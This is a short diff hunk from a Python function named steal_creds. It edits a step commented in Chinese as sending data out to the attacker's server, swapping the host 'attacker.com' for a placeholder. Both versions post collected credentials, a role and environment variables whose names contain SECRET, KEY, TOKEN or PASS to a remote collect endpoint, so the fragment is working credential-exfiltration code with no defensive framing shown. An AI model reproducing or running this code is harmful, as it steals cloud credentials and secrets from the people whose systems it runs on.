@@ -38,7 +38,7 @@ def steal_creds():
     ).json()
 
     # Step 4: 外带到攻击者服务器
-    requests.post("https://attacker.com/collect", json={
+    requests.post("https://<attacker-domain>/collect", json={
         "role": role, "creds": creds, "env": {k: v for k, v in env_vars.items()
             if "SECRET" in k or "KEY" in k or "TOKEN" in k or "PASS" in k}
     })
